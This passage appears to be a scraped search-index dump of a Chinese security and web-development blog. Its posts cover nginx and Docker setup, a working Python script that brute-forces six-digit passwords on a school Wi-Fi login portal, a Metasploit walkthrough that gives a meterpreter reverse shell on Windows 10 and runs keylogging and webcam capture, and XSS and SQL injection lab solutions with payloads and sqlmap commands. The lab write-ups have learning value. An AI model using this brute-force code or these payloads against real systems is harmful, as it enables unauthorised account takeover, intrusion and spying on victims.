如有错误或建议，请在评论处指出！","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"图灵机器人","slug":"图灵机器人","permalink":"https://wxt406611016.github.io/tags/%E5%9B%BE%E7%81%B5%E6%9C%BA%E5%99%A8%E4%BA%BA/"}]},{"title":"linux配置nginx反向代理","slug":"linux配置nginx反向代理","date":"2019-12-25T16:00:00.000Z","updated":"2021-01-28T14:35:17.579Z","comments":true,"path":"2019/12/26/linux配置nginx反向代理/","link":"","permalink":"https://wxt406611016.github.io/2019/12/26/linux%E9%85%8D%E7%BD%AEnginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/","excerpt":"将web项目部署到服务器之后，通过nginx反向代理可以帮助隐藏web项目所在的端口号，避免了端口暴露在外的风险，本文主要讲述反向代理的概念和在linux环境下如何配置nginx反向代理。","text":"将web项目部署到服务器之后，通过nginx反向代理可以帮助隐藏web项目所在的端口号，避免了端口暴露在外的风险，本文主要讲述反向代理的概念和在linux环境下如何配置nginx反向代理。 1.什么是反向代理？反向代理（Reverse Proxy）方式:是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器；并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。通常的代理服务器，只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中。当一个代理服务器能够代理外部网络上的主机，访问内部网络时，这种代理服务的方式称为反向代理服务。简单来讲，正向代理是作为客户端的代理服务器，反向代理则是作为服务器端的代理服务器。 2.安装nginx服务器安装步骤非常简单，打开终端，输入：sudo apt-get install nginx 在终端输入以下内容，打开nginx服务器：service nginx start 3.配置nginx服务器apt-get安装下的nginx配置文件的位置在 /etc/nginx/sites-available/default，打开default文件，并将proxy_pass处的值，改为你想要代理的服务器端口地址。(下图中代理的为5000端口号） 123456789101112server &#123; listen 80; server_name localhost; location &#x2F; &#123; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass &quot;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&quot;; &#125; &#125; 接下来要将配置信息重新载入，终端输入：/etc/init.d/nginx reload 4.测试结果打开一个本地web项目，开放在5000端口在浏览器中输入url：0.0.0.0或0.0.0.0:80（因为nginx默认开放80端口，并且可以省略端口号）可以看到，浏览器显示的内容正是开放在5000端口的flask项目。 如有错误或建议，请在评论处指出！","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"反向代理","slug":"反向代理","permalink":"https://wxt406611016.github.io/tags/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"}]},{"title":"python脚本-暴力破解无线网弱密码","slug":"python脚本-暴力破解无线网弱密码","date":"2019-04-25T16:00:00.000Z","updated":"2021-01-28T14:35:30.531Z","comments":true,"path":"2019/04/26/python脚本-暴力破解无线网弱密码/","link":"","permalink":"https://wxt406611016.github.io/2019/04/26/python%E8%84%9A%E6%9C%AC-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%97%A0%E7%BA%BF%E7%BD%91%E5%BC%B1%E5%AF%86%E7%A0%81/","excerpt":"背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥）","text":"背景：学校最近重新架设无线网一体化，而初始密码为弱密码（6位数字），下面我们要做的就是通过暴力破解的方式破解弱密码！（所以建议大家以后无论是在注册还是什么情况，都千万不要使用弱密钥） 攻击过程如下： 1.获取get参数在爆破之前我们需要获取一些get参数，这些参数应该包含着我们输入的登陆信息。 登陆无线网前需要在网页上进行身份验证。随便输入一个账号密码，看返回结果是什么。比如输入学号：1122，密码：1231131，运营商选择联通。提示无账号，但是无所谓，毕竟我们的目的在于接下来的抓包环节。抓包看看get的网址，选择我们有用的，比如下图中get参数中包含了我们输入的信息。这很有用，因为这为我们下面的python脚本提供了url。看一下回显结果，提示&quot;result&quot;:&quot;0&quot;等信息。我们再输入一个正确的账号密码，将get参数中的user_account和user_password换成正确的（我自己的无线网认证账号密码，账号和密码就不公布了hhhhh），看一下正确登陆后的回显内容。显示&quot;result&quot;:&quot;1&quot;,&quot;认证成功&quot;等信息。ok，我们可以根据回显内容的不同来判断是否验证成功。下面就可以进行暴力破解了，只需要选定一个存在的账号，然后穷举6位数字密码的所有可能性，一一验证即可。 python脚本暴力破解直接上代码吧： 123456789101112131415161718192021222324252627282930313233from time import strftimefrom itertools import productfrom time import sleepimport requestsfrom requests import postimport reimport threading #可开启多线程import time def fx(iter&#x3D;[&#39;0123456789&#39;]): def psgen(x): #密码生成器，穷举所有的密码可能性，参数x表示密码长度 for r in iter: for repeat in range(x,x+1): for ps in product(r,repeat&#x3D;repeat): yield &#39;&#39;.join(ps) for ps in psgen(6): url&#x3D;&#39;http:&#x2F;&#x2F;10.2.5.251:801&#x2F;eportal&#x2F;?c&#x3D;Portal&amp;a&#x3D;login&amp;callback&#x3D;dr1556270398016&amp;login_method&#x3D;1&amp;user_account&#x3D;08xxxx05@unicom&amp;user_password&#x3D;%s&amp;wlan_user_ip&#x3D;10.3.37.27&amp;wlan_user_mac&#x3D;d07e351e9bbe&amp;wlan_ac_ip&#x3D;&amp;wlan_ac_name&#x3D;NAS&amp;jsVersion&#x3D;3.0&amp;_&#x3D;1556270388759&#39;%ps try: s&#x3D;requests.session() rs&#x3D;s.get(url).content.decode(&#39;utf-8&#39;) r &#x3D; re.findall(r&#39;认证成功&#39;,rs) #判断验证结果 if r: with open(&quot;resut.csv&quot;,&quot;a+&quot;) as f: #存储密码结果到result.csv文件中 f.write(&#39;密码破解成功结果为：,&#39;+ ps + &#39;,&#39; + strftime(&quot;%c&quot;) + &#39;,&#39; + url+&#39;\\n&#39;) print(&#39;密码破解成功：&#39;+ps+&#39; ,&#39;+rs) break else: print(ps+&#39;密码不正确&#39;+rs) except: sleep(1) pass fx([&#39;0123456789&#39;]) 接下来运行等待结果就ok了。看一下运行过程图：由于一共的可能性有1000000种，而且每一次穷举都要进行一次网络验证，即每一次验证都有网络延时，所以要等上一会儿。大概爆破了一个多小时，终于爆出了正确结果。生成了result.csv文件，查看一下文件内容，如下所示： 1密码破解成功结果为：,15xxxx,Fri Apr 26 17:28:19 2019,http:&#x2F;&#x2F;10.2.5.251:801&#x2F;eportal&#x2F;?c&#x3D;Portal&amp;a&#x3D;login&amp;callback&#x3D;dr1556270398016&amp;login_method&#x3D;1&amp;user_account&#x3D;08xxxx05@unicom&amp;user_password&#x3D;15xxxx&amp;wlan_user_ip&#x3D;10.3.37.27&amp;wlan_user_mac&#x3D;d07e351e9bbe&amp;wlan_ac_ip&#x3D;&amp;wlan_ac_name&#x3D;NAS&amp;jsVersion&#x3D;3.0&amp;_&#x3D;1556270388759 速度慢可以开启多线程，同时进行测试。结果好很多！ 爆破完成，由此看见，弱密钥的危险性。如有错误或建议，请在评论出指出！","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"暴力破解","slug":"暴力破解","permalink":"https://wxt406611016.github.io/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"}]},{"title":"利用docker将web项目部署到服务器","slug":"利用docker将web项目部署到服务器","date":"2019-03-30T16:00:00.000Z","updated":"2021-01-28T14:33:37.689Z","comments":true,"path":"2019/03/31/利用docker将web项目部署到服务器/","link":"","permalink":"https://wxt406611016.github.io/2019/03/31/%E5%88%A9%E7%94%A8docker%E5%B0%86web%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"完成了一个简单的web项目，想部署到云服务器，利用docker是一个很好的办法 创建docker容器在当前web项目目录下创建Dockerfile和requirements.txt两个文件。文件填写内容根据你的web项目来定，具体参考官网教程。～～docker官网～～","text":"完成了一个简单的web项目，想部署到云服务器，利用docker是一个很好的办法 创建docker容器在当前web项目目录下创建Dockerfile和requirements.txt两个文件。文件填写内容根据你的web项目来定，具体参考官网教程。～～docker官网～～ 接下来创建docker镜像，打开终端，输入docker image build -t name .name为你创建的镜像名字，自定义，注意不要漏了name后的那个“.”然后输入docker image ls显示已存在的docker镜像，cumt是我的web项目，下面我要将cumt这个镜像部署到我的阿里云服务器。 生成静态文件将docker镜像导出为静态文件 docker save cumt:latest &gt; cumt.tar cumt:latest为镜像名, cumt.tar为新生成的静态文件名。 部署到云服务器使用scp将静态文件上传到服务器端scp ./cumt.tar root@47.106.130.6:/cumt.tar 使用ssh登陆你的云服务器ssh root@47.106.130.6 输入ls查看是否上传成功ls 如果ls下没有找到你上传的静态文件，使用find命令查找它。find / -name cumt.tar 还原静态文件在静态文件所在位置目录下运行docker load命令还原。docker load &lt; cumt.tar输入docker image ls发现，已还原为镜像文件。 大功告成，可以直接运行了，如果不需要连接数据库的话直接输入docker run -p 4000:5000 cumt如果需要连接数据库，则需要用link方法挂载数据库（前提是你已经有数据库镜像）docker run --link your-mysql -p 4000:5000 cumt访问服务器公网的4000端口就可以访问你的web项目了。注意要在控制台打开服务器的4000端口（映射端口号可以自定义） 小结:利用静态文件进行容器的迁移, 是一件非常简单的事情, 你可以像发布一个软件包一样将自己的docker容器生成的静态文件分发到各类操作系统, docker才是真正的跨平台呀!","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wxt406611016.github.io/tags/docker/"}]},{"title":"利用msf攻击win10","slug":"利用msf攻击win10","date":"2019-03-29T16:00:00.000Z","updated":"2021-01-28T14:34:02.033Z","comments":true,"path":"2019/03/30/利用msf攻击win10/","link":"","permalink":"https://wxt406611016.github.io/2019/03/30/%E5%88%A9%E7%94%A8msf%E6%94%BB%E5%87%BBwin10/","excerpt":"攻击环境：攻击者系统：虚拟机下kali linux靶机系统：win10（需要打开Easy File Sharing服务）攻击者ip：10.3.134.27靶机ip：10.3.37.56攻击者和靶机在同一个wifi下，保证在同一网段里，能互相ping通。漏洞利用：EsayFileSharing 注意点： 攻击者的虚拟机网络模式应选择桥接模式。","text":"攻击环境：攻击者系统：虚拟机下kali linux靶机系统：win10（需要打开Easy File Sharing服务）攻击者ip：10.3.134.27靶机ip：10.3.37.56攻击者和靶机在同一个wifi下，保证在同一网段里，能互相ping通。漏洞利用：EsayFileSharing 注意点： 攻击者的虚拟机网络模式应选择桥接模式。 准备工作完成，可以开始内网渗透之旅了。 step-1首先我们先用nmap扫描一下靶机开了哪些服务root@kali:~# nmap -sV 10.3.37.56我们可以看到80端口和443端口开放了，对应的是Easy File Sharing Web Server，满足EasyFileSharing漏洞攻击，进入下一步。 step-2打开msf控制台，设置攻击参数 12root@kali:~# msfconsole #进入控制台，稍微等一下msf &gt; search EasyFileSharing #查找我们要用的漏洞 我们选择最新的一个，2017-06-12的版本，并设置payload。 12msf &gt; use exploit&#x2F;windows&#x2F;http&#x2F;easyfilesharing_post #使用这个漏洞msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp #设置攻击payload 我们用show options看一下需要什么攻击参数 1msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; show options 根据Required属性看一下哪些是需要配置的，其中一些是配置好的，我们只需将其他的配置好就ok了。 12msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set lhost 10.3.134.27 #设置本地ipmsf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; set rhost 10.3.37.56 #设置远程ip 参数都配置好了，接着就是激动人心的exploit了。 1msf exploit(windows&#x2F;http&#x2F;easyfilesharing_post) &gt; exploit #攻击 逐个输入以下命令，试试 12345678meterpreter &gt; getuid #获取靶机uidmeterpreter &gt; shell #进入靶机shellmeterpreter &gt; screenshot #靶机截屏meterpreter &gt; webcam_snap #用靶机摄像头拍照meterpreter &gt; webcam_stream #用靶机摄像头录像meterpreter &gt; keyscan_start #开启键盘记录meterpreter &gt; keyscan_dump #捕获键盘记录meterpreter &gt; keyscan_stop #停止键盘记录 我们来测试几个好玩的1st.捕捉靶机键盘记录2nd.捕捉靶机截屏3rd.用靶机摄像头拍照 小结：我们做攻击实验都是在环境都配置好的情况下，现实生活中不会有这么好的肉鸡。而且网络攻击属于违法行为，人生路漫漫，且行且珍惜hhhhh","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"msf","slug":"msf","permalink":"https://wxt406611016.github.io/tags/msf/"}]},{"title":"xss(1~10)","slug":"xss(1~10)","date":"2019-03-07T16:00:00.000Z","updated":"2021-01-28T14:36:12.191Z","comments":true,"path":"2019/03/08/xss(1~10)/","link":"","permalink":"https://wxt406611016.github.io/2019/03/08/xss(1~10)/","excerpt":"xss闯关入口","text":"xss闯关入口 less-1查看源代码， 123$str &#x3D; $_GET[&quot;name&quot;];echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;?&gt; 并没有过滤，payload:name=&lt;script&gt;alert(1)&lt;/script&gt; less-2查看源代码， 12345$str &#x3D; $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action&#x3D;level2.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt; 有两处输出，第一处在echo处，但被做了转义处理，起到过滤效果，第二处在input处，没有过滤，所以选择在表单的input里攻击,注意语句闭合方式为 “ ，payload:&quot; onclick=&quot;alert(1) less-3查看源代码， 12345$str &#x3D; $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action&#x3D;level3.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; 两处输出位置都做了转义处理，都被过滤了，所以 “，&lt;，&gt;符号（双引号和尖括号）就没有效果了，但是源码里input里的value的闭合方式为 ‘，所以还是可以攻击的。payload:&#39; onclick=&#39;alert(1) less-4查看源代码， 1234567$str &#x3D; $_GET[&quot;keyword&quot;];$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action&#x3D;level4.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; 两处输出位置，一处被转义了，input处没被转义，但是被做了函数处理，尖括号被替换为了空，和less-3的套路一样。payload:&quot; onclick=&quot;alert(1) less-5查看源代码， 1234567$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action&#x3D;level5.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; 有两处输出，一处被做了转义处理，input处输入被做了小写和on，&lt;script被做了替换处理，payload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt; less-6查看源代码， 123456789$str &#x3D; $_GET[&quot;keyword&quot;];$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action&#x3D;level6.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt; 有两处输出，一处被做了转义处理，input处&lt;script,on,src,data,href被做了替换处理，但是没有做less-5中的小写处理，所以可以通过大写替换字绕过，payload:&quot; ONclick=&quot;alert(1) less-7查看源代码， 123456789$str &#x3D;strtolower( $_GET[&quot;keyword&quot;]);$str2&#x3D;str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3&#x3D;str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4&#x3D;str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5&#x3D;str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6&#x3D;str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action&#x3D;level7.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt; 有两处输出，一处被做了转义处理，input处做了小写处理和script,on,src,data,href被做了替换处理，可以利用双写来拼合成，例如oonn被处理后就变为了on，payload:&quot; oonnclick=&quot;alert(1) less-8查看源代码， 123456789101112$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);……&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt; echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;?&gt; 有两处输出，一处input做了转义处理，另一处做了小写处理和script,on,src,data,href，” ，被做了替换处理，这题的关键在友情链接处,点击”添加友情链接”后会在友情链接出加入一个拼接的语句。t的ASCII码116用表示为”&amp;#116”，同理:表示为”&amp;#58”，payload:javascrip&amp;#116:alert(1) less-9查看源代码， 1234567891011121314151617181920$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);……&lt;form action&#x3D;level9.php method&#x3D;GET&gt;&lt;input name&#x3D;keyword value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;……if(false&#x3D;&#x3D;&#x3D;strpos($str7,&#39;http:&#x2F;&#x2F;&#39;))&#123; echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;; &#125;else&#123; echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;&#125; 有两处输出，一处input做了转义处理，另一处做了小写处理和script,on,src,data,href，” ，被做了替换处理，而且出现了strpos()函数，表示查找 “http://“ 在字符串中第一次出现的位置。只要!=false，就会跳向可攻击的语句，所以构造的语句中要含有http://，利用javascript中的注释符//，payload:javascrip&amp;#116:alert(1)//http:// less-10查看源代码， 123456789$str &#x3D; $_GET[&quot;keyword&quot;];$str11 &#x3D; $_GET[&quot;t_sort&quot;];$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id&#x3D;search&gt;&lt;input name&#x3D;&quot;t_link&quot; value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot; value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot; value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt; 有两处输出，一处被做了转义，一处input被作为隐藏表单(type=”hidden”)处理页面没有显示，需要先将隐藏表单触发显示出来，然后在input处攻击，看到url处可以get参数t_sort，所以可以构造payload了。payload:url后加 &amp;t_sort=xss&quot; onclick=alert(1) type=&quot;text&quot; xss(1~10)关卡全部完成了，如有错误，欢迎在评论中指出!","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://wxt406611016.github.io/tags/ctf/"}]},{"title":"sqli-labs(1~22)","slug":"sqli-labs(1_22)","date":"2019-03-06T16:00:00.000Z","updated":"2021-01-28T14:36:07.043Z","comments":true,"path":"2019/03/07/sqli-labs(1_22)/","link":"","permalink":"https://wxt406611016.github.io/2019/03/07/sqli-labs(1_22)/","excerpt":"sqli-labs网址链接","text":"sqli-labs网址链接 less-1方法一：输入?id=1正常显示，输入?id=1’报错，输入?id=1’ and 1=’1，正常显示，得知是字符型注入，爆字段： ?id=1&#39; order by 3--+查看回显内容：?id=-1‘ union select 1,2,3--+爆库名，版本号：？id=-1&#39; union select 1,database(),version()爆所有数据库：?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23爆表名：?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;%23爆列名：?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23爆数据：?id=-1&#39; union select 1,2,group_concat(id,username,password) from users%23 方法二：借助sqlmap软件直接爆破最终payload：./sqlmap.py -u &quot;http://43.247.91.228:84/Less-1/?id=1&quot; -D security -T users --dump得到的数据结果如下： less-2输入1’，根据报错信息确定输入的内容被原封不动的带入到数据库中，输入?id=1 and 1=1,显示正常，得知是数字型注入，将单引号去掉，其他方法步骤和less-1一样，不再重复了。直接上爆数据payload：?id=-1 union select 1,2,group_concat(id,username,password) from users%23sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-3单引号报错，输入1’，根据报错信息发现输入的内容后有’)，想到应该以 ‘) 来闭合表达式，脑补一下输入1后的sql语言，形如select … from … where id=(‘1’) …，在第一题中id=1的后面加上’）,其他步骤和方法和less-1一样，不再重复了。直接上爆数据payload：?id=-1&#39;) union select 1,2,group_concat(id,username,password) from users%23sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-4双引号报错，输入1’，显示正常，输入1’’,根据报错信息发现输入的内容后有”)，想到应该以 ‘’) 来闭合表达式，脑补一下输入1后的sql语言，形如select … from … where id=(‘’1’’) …，在第一题中id=1的后面加上’’）,其他步骤和方法和less-1一样，不再重复了。直接上爆数据payload：?id=-1&quot;) union select 1,2,group_concat(id,username,password) from users%23sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-5输入之前的内容发现不再显示数据信息，应该是报错注入或者盲注。输入?id=1’报错，根据sql语法错误提示，得知是字符型报错注入。爆库名：?id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23爆表名：?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)%23爆列名：?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e),1)%23爆数据：?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)%23sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-6与第5关类似，只不过这一关使用的是” “的方式闭合字符串，我们只需要将?id=1’ 改为 ?id=1”,后面的参数不变，其余过程不再赘述，和less-5一样。sqlmap同样可以直接爆破，payload后的参数和less-1一样。 less-7输入?id=1&#39;报错，经几次测试后发现只有在后面添加 ‘ 会报错，但是这次后台对报错进行了处理，所有错误都显示语法错误。我们利用单引号进行进一步注入：?id=1&#39; and sleep(3)--+还是报错，猜测是不是过滤了某些字符，测试过滤字符：?id=1&#39; and sleep(3) or 1=&#39;1发现显示正常了，发现后台过滤了的注释字符,通过盲注一步步判断判断数据库的第一个字符是s：?id=1&#39; and ascii(substr((select database()),1,1))=115 and 1=&#39;1显示正常，说明数据库的第一个字符的acsll值为115，即为s。一步步尝试，过程比较麻烦，使用脚本比较方便。可直接sqlmap跑一下，payload后的参数和less-1一样。 less-8这一个和less-7差不多，把报错全部过滤了，如果错误就没有返回，正确就返回you are in……，而其注释符没有被过滤，我们就可以利用基于布尔的盲注进行测试：判断数据库的第一个字符是s：?id=1&#39; and ascii(substr((select database()),1,1))=115--+一步步尝试，过程比较麻烦，使用脚本比较方便。可直接sqlmap跑一下，payload后的参数和less-1一样。 less-9无论输入什么都是返回相同的内容，报错注入无效了，尝试一下时间盲注：判断是否有注入：?id=1&#39; and sleep(3)--+，停留了3s后刷新，说明存在注入点。其他的和less-7差不多，只是在最后要加上and sleep(3)--+来判断对错。判断数据库的第一个字符是s：?id=1&#39; and ascii(substr((select database()),1,1))=115 and sleep(3)--+一步步尝试，过程比较麻烦，使用脚本比较方便。可直接sqlmap跑一下，payload后的参数和less-1一样。 less-10和less-9类似，只是闭合符号变成了 ‘’ ，检查是否存在注入：?id=1&#39;&#39; and sleep(3)--+,停留了3s后刷新，说明存在注入点。其他的和less-9一样了，判断数据库的第一个字符是s：?id=1&#39;&#39; and ascii(substr((select database()),1,1))=115 and sleep(3)--+一步步尝试，过程比较麻烦，使用脚本比较方便。可直接sqlmap跑一下，payload后的参数和less-1一样。 less-11方法一：页面显示变了，不再是get方式传递参数，改为post方式传参，通过尝试发现闭合方式为 ‘ ,先使用万能钥匙登陆，登陆成功。查看是否有注入点，爆字段试试，开始尝试order by 3#提示错误，最终确定order by 2#正常，接着判断回显内容，并爆数据库，爆表名，爆列名，爆数据，方法二：还可以借助sqlmap软件直接爆破最终payload：./sqlmap.py -u &quot;http://localhost/sqli-labs/Less-11/&quot; --data=&quot;uname=*&amp;passwd=*&quot; -D security -T users --dump less-12根据题目提示闭合方式应该为 “) ，输入万能钥匙，果然登陆成功，其他的和less-11一样，只是闭合方式变成了”)，其他的就不赘述了。下面直接上爆数据的截图，也可直接sqlmap跑一下，payload后的参数和less-11一样。 less-13根据提示闭合方式应该是 ‘) ，但是利用万能钥匙成功登陆后并不显示有用信息，尝试报错注入，竟然成功了。接着爆表名：接着爆列名：最后爆数据：也可直接sqlmap跑一下，payload后的参数和less-11一样。 less-14通过尝试发现闭合方式为 “ ，其他方法和less-13一样，不再赘述，下面直接上爆数据的截图，也可直接sqlmap跑一下，payload后的参数和less-11一样。 less-15根据提示闭合方式为 ‘ ，但无论输入什么，都不再输出任何信息，只能尝试盲注，判断库名的第一个字符是否为s:返回登陆成功，说明库名的第一个字符为s，反之则返回登陆失败。接着要一步步尝试，过程比较麻烦，使用脚本比较方便。 less-16通过尝试发现闭合方式为 “)，其他和less-15一样，只不过改变了闭合方式，直接上判断库名第一个字符是否为s的截图返回登陆成功，说明说明库名的第一个字符为s，反之则返回登陆失败。接着要一步步尝试，过程比较麻烦，使用脚本比较方便。 less-17利用万能钥匙登陆，竟然被嘲讽了。发现页面显示重置密码，sql语句应该类似于update table set password=&#39;xxx&#39; where username = &#39;xxx&#39;,需要我们先知道一个username，前几关爆数据的时候username里都有Dumb,我们输入username为Dumb，密码为123456后提示密码更改成功，然后进一步尝试，利用用户名为Dumb在密码处进行注入，在密码栏里写入：1&#39; order by 3# 